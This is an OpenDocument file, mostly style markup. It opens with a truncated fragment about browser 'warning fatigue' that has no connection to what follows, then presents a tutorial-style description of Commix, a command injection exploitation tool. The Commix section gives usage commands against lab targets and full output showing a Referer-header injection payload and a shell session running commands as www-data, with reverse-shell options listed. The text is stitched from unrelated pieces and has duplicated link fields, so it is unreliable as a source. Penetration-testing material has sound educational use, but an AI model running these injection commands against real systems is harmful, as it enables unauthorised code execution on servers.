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Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'"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5"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6" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'"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4.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-size="14.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'"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2.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'"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2.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'"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2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2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2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7" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T2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2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3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3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36" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T3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4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4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4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5" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T4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4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48" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T4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5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1" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T5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5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4" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T5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5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57" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T5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5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60" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T6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6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6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6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6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6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67" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T6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text:display="none"/>
    </style:style>
    <style:style style:name="T6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bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T72" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T73" style:family="text">
      <style:text-properties fo:font-size="13.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" style:use-window-font-color="tru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0.00pt" fo:font-weight="normal" fo:font-family="'Liberation Mono'" style:font-family-asian="'Liberation Mono'" style:font-family-complex="'Liberation Mono'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T76"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text:display="none"/>
    </style:style>
    <style:style style:name="T77"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78" style:family="text">
      <style:text-properties fo:font-size="10.00pt" fo:font-weight="normal" fo:font-family="'Liberation Mono'" style:font-family-asian="'Liberation Mono'" style:font-family-complex="'Liberation Mono'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T79"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text:display="none"/>
    </style:style>
    <style:style style:name="T80"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81" style:family="text">
      <style:text-properties fo:font-size="10.00pt" fo:font-weight="normal" fo:font-family="'Liberation Mono'" style:font-family-asian="'Liberation Mono'" style:font-family-complex="'Liberation Mono'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T82"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83" style:family="text">
      <style:text-properties fo:font-size="10.00pt" fo:font-weight="normal" fo:font-family="'Liberation Mono'" style:font-family-asian="'Liberation Mono'" style:font-family-complex="'Liberation Mono'" fo:background-color="transparent" style:use-window-font-color="true"/>
    </style:style>
    <style:style style:name="T84"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85" style:family="text">
      <style:text-properties fo:font-size="10.00pt" fo:font-weight="normal" fo:font-family="'Liberation Mono'" style:font-family-asian="'Liberation Mono'" style:font-family-complex="'Liberation Mono'"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0.00pt" fo:font-weight="normal" fo:font-family="'Liberation Mono'" style:font-family-asian="'Liberation Mono'" style:font-family-complex="'Liberation Mono'"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top="12.00pt" fo:margin-bottom="6.00pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left" fo:margin-top="10.00pt" fo:margin-bottom="6.00pt"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left" fo:margin-top="12.00pt" fo:margin-bottom="6.00pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <text:list-style style:name="L8">
      <text:list-level-style-bullet text:level="1" text:bullet-char="•">
        <style:list-level-properties text:space-before="21.20pt" text:min-label-width="14.15pt"/>
        <style:text-properties fo:font-family="Symbol"/>
      </text:list-level-style-bullet>
    </text:list-style>
    <style:style style:name="P8" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <text:list-style style:name="L11">
      <text:list-level-style-bullet text:level="1" text:bullet-char="•">
        <style:list-level-properties text:space-before="21.20pt" text:min-label-width="14.15pt"/>
        <style:text-properties fo:font-family="Symbol"/>
      </text:list-level-style-bullet>
    </text:list-style>
    <style:style style:name="P11" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left" fo:margin-top="6.00pt" fo:margin-bottom="6.00pt"/>
    </style:style>
    <text:list-style style:name="L14">
      <text:list-level-style-bullet text:level="1" text:bullet-char="•">
        <style:list-level-properties text:space-before="21.20pt" text:min-label-width="14.15pt"/>
        <style:text-properties fo:font-family="Symbol"/>
      </text:list-level-style-bullet>
    </text:list-style>
    <style:style style:name="P14" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left" fo:margin-top="6.00pt" fo:margin-bottom="6.00pt"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left" fo:margin-bottom="14.15pt"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left" fo:margin-bottom="14.15pt"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left" fo:margin-bottom="14.15pt"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left" fo:margin-bottom="14.15pt"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left" fo:margin-bottom="14.15pt"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left" fo:margin-bottom="14.15pt"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left" fo:margin-bottom="14.15pt"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-left="35.35pt" fo:text-indent="-14.15pt" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left"/>
    </style:style>
  </office:automatic-styles>
  <office:body>
    <office:text>
      <text:p text:style-name="P1"><text:span text:style-name="T1">“Warning fatigue” means browser users ignore up to 70% of security alerts</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2">” the researchers said. “Studies of Technically advanced<text:s text:c="2"/>users such as Linux users could help improve their warning responses.Designers of new warning mechanisms should always perform an analysis of the number of times the system is projected to raise a warning, and security practitioners should consider the effectsthat warning architectures have on warning fatigue.”</text:span></text:p>
      <text:p text:style-name="P3"><draw:frame text:anchor-type="as-char" svg:width="170.13mm" svg:height="34.93mm" style:rel-width="scale" style:rel-height="scale"><draw:object-ole xlink:href="OleObj1"/><draw:image xlink:href="ObjectReplacements/OleObj1"/></draw:frame><text:a xlink:href="https://tools.kali.org/exploitation-tools/commix"><text:span text:style-name="T5">Commix</text:span></text:a><text:span text:style-name="T6">: Penetration Testing /Exploitation Tools</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T7">Commix (short for [comm]and [i]njection e[x]ploiter) has a simple environment and it can be used, from web developers, penetration testers or even security researchers to test web applications with the view to find bugs, errors or vulnerabilities related to<text:s/></text:span><text:span text:style-name="T8">command injection</text:span><text:span text:style-name="T9"><text:s/></text:span><text:span text:style-name="T10">attacks. By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter . Commix is written in Python programming language.</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T12"><text:s text:c="12"/>Author: Anastasios Stasinopoulos </text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T12"><text:s text:c="12"/>License: GPLv3 </text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T13">Command Injection</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T14">Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation. </text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T14">Commix comes packaged on the<text:s/></text:span><text:span text:style-name="T15">official repositories</text:span><text:span text:style-name="T16"><text:s/>of the following Linux distributions, so you can use the<text:s/></text:span><text:span text:style-name="T17">package manager</text:span><text:span text:style-name="T18"><text:s/>to install it!</text:span></text:p>
      <text:list text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P8"><text:a xlink:href="https://archstrike.org/"><text:span text:style-name="T20">ArchStrike</text:span></text:a><text:span text:style-name="T21"><text:s/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:a xlink:href="http://blackarch.org/"><text:span text:style-name="T23">BlackArch Linux</text:span></text:a><text:span text:style-name="T24"><text:s/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:a xlink:href="https://backbox.org/"><text:span text:style-name="T26">BackBox</text:span></text:a><text:span text:style-name="T27"><text:s/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:a xlink:href="https://www.kali.org/"><text:span text:style-name="T29">Kali Linux</text:span></text:a><text:span text:style-name="T30"><text:s/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:a xlink:href="https://www.parrotsec.org/"><text:span text:style-name="T32">Parrot Security OS</text:span></text:a><text:span text:style-name="T33"><text:s/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P9"><text:a xlink:href="http://www.weaknetlabs.com/"><text:span text:style-name="T35">Weakerthan Linux</text:span></text:a><text:span text:style-name="T36"><text:s/></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P10"><text:span text:style-name="T36">Commix also comes<text:s/></text:span><text:span text:style-name="T37">as a plugin</text:span><text:span text:style-name="T38">, on the following penetration testing frameworks:</text:span></text:p>
      <text:list text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P11"><text:a xlink:href="https://github.com/trustedsec/ptf"><text:span text:style-name="T40">TrustedSec</text:span><text:span text:style-name="T41">HYPERLINK "https://github.com/trustedsec/ptf"</text:span><text:span text:style-name="T42">'</text:span><text:span text:style-name="T43">HYPERLINK "https://github.com/trustedsec/ptf"</text:span><text:span text:style-name="T44">s Penetration Testers Framework (PTF)</text:span></text:a><text:span text:style-name="T45"><text:s/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11"><text:a xlink:href="https://github.com/owtf/owtf"><text:span text:style-name="T47">OWASP Offensive Web Testing Framework (OWTF)</text:span></text:a><text:span text:style-name="T48"><text:s/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11"><text:a xlink:href="https://github.com/zardus/ctf-tools"><text:span text:style-name="T50">CTF-Tools</text:span></text:a><text:span text:style-name="T51"><text:s/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11"><text:a xlink:href="https://tools.pentestbox.com/"><text:span text:style-name="T53">PentestBox</text:span></text:a><text:span text:style-name="T54"><text:s/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11"><text:a xlink:href="https://github.com/x3omdax/PenBox"><text:span text:style-name="T56">PenBox</text:span></text:a><text:span text:style-name="T57"><text:s/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11"><text:a xlink:href="https://github.com/LionSec/katoolin"><text:span text:style-name="T59">Katoolin</text:span></text:a><text:span text:style-name="T60"><text:s/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11"><text:a xlink:href="https://github.com/Aptive/penetration-testing-tools"><text:span text:style-name="T62">Aptive</text:span><text:span text:style-name="T63">HYPERLINK "https://github.com/Aptive/penetration-testing-tools"</text:span><text:span text:style-name="T64">'</text:span><text:span text:style-name="T65">HYPERLINK "https://github.com/Aptive/penetration-testing-tools"</text:span><text:span text:style-name="T66">s Penetration Testing tools</text:span></text:a><text:span text:style-name="T67"><text:s/></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12"><text:a xlink:href="https://github.com/sidaf/homebrew-pentest"><text:span text:style-name="T69">Homebrew Tap - Pen Test Tools<text:s/></text:span></text:a><text:span text:style-name="T70"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P13"><text:span text:style-name="T71">Supported Platforms</text:span></text:p>
      <text:list text:style-name="L14">
        <text:list-item>
          <text:p text:style-name="P14"><text:span text:style-name="T72">Linux </text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14"><text:span text:style-name="T72">Mac OS X </text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P15"><text:span text:style-name="T72">Windows (experimental) </text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P16"><text:span text:style-name="T73">Usage</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T74">To get a list of all options and switches use:</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T75">python commix.py -h</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T75"><text:s/></text:span><text:a xlink:href="mailto:root@kali"><text:span text:style-name="T77">root@kali</text:span></text:a><text:span text:style-name="T78">:~# commix -h</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T78"><text:s/></text:span><text:a xlink:href="mailto:root@kali"><text:span text:style-name="T80">root@kali</text:span></text:a><text:span text:style-name="T81">:~# commix --url http://192.168.20.12/dvwa/vulnerabilities/exec/ \</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T81">root@kali:~# commix --url="http://192.168.0.23/commix-testbed/scenarios/referer/referer(classic).php" –level=3</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T81"><text:line-break/>                                       __<text:line-break/>   ___    ___     ___ ___     ___ ___ /\_\   __  _<text:line-break/>  /'___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v1.7-stable<text:line-break/> /\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \<text:s/></text:span><text:a xlink:href="///"><text:span text:style-name="T82">\\/</text:span></text:a><text:span text:style-name="T83">&gt;  &lt;/<text:line-break/> \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\<text:s/></text:span><text:a xlink:href="http://commixproject.com"><text:span text:style-name="T84">http://commixproject.com</text:span></text:a><text:span text:style-name="T85"><text:line-break/>  \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)<text:line-break/><text:line-break/>+--<text:line-break/>Automated All-in-One OS Command Injection and Exploitation Tool<text:line-break/>Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst)<text:line-break/>+--<text:line-break/><text:line-break/>[*] Checking connection to the target URL... [ SUCCEED ]<text:line-break/>[*] Setting the HTTP header User-Agent for tests.<text:line-break/>[*] Testing the (results-based) classic command injection technique... [ FAILED ]<text:line-break/>[*] Testing the (results-based) dynamic code evaluation technique... [ FAILED ]<text:line-break/>[*] Testing the (blind) time-based command injection technique... [ FAILED ]<text:line-break/>[*] Trying to create a file in '/var/www/html/commix-testbed/scenarios/referer/'...<text:line-break/>[!] Warning: It seems that you don't have permissions to read and/or write files in '/var/www/html/commix-testbed/scenarios/referer/'.<text:line-break/>[?] Do you want to try the temporary directory (/tmp/) [Y/n] &gt; Y<text:line-break/>[*] Trying to create a file, in temporary directory (/tmp/)...<text:line-break/>[*] Testing the (semi-blind) tempfile-based injection technique... [ FAILED ]<text:line-break/>[!] Warning: The tested HTTP header User-Agent seems to be not injectable.<text:line-break/>[*] Setting the HTTP header Referer for tests.<text:line-break/>[*] Testing the (results-based) classic command injection technique... [ SUCCEED ]<text:line-break/>[+] The HTTP header Referer seems injectable via (results-based) classic command injection technique.<text:line-break/>    [~] Payload: ';echo KSXTLU$((18+64))$(echo KSXTLU)KSXTLU'</text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T85">[?] Do you want a Pseudo-Terminal shell? [Y/n] &gt; Y<text:line-break/><text:line-break/>Pseudo-Terminal (type '?' for available options)<text:line-break/>commix(os_shell) &gt; ?<text:line-break/><text:line-break/>  ---[ Available options ]---<text:line-break/>  Type '?' to get all the available options.<text:line-break/>  Type 'back' to move back from the current context.<text:line-break/>  Type 'quit' (or use &lt;Ctrl-C&gt;) to quit commix.<text:line-break/>  Type 'reverse_tcp' to get a reverse TCP connection.<text:line-break/>  Type 'bind_tcp' to set a bind TCP connection.<text:line-break/><text:line-break/>commix(os_shell) &gt; id<text:line-break/><text:line-break/>uid=33(www-data) gid=33(www-data) groups=33(www-data)<text:line-break/><text:line-break/>commix(os_shell) &gt; ls<text:line-break/><text:line-break/>index.html referer(blind).php referer(classic).php referer(eval).php</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T85">commix(os_shell) &gt; quit<text:line-break/><text:line-break/>root@kali:~#<text:line-break/></text:span><text:span text:style-name="T86"/></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T87"><text:s/></text:span></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T88"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T88"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T88"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T88"/></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T88"/></text:p>
      <text:p text:style-name="P27"><text:span text:style-name="T8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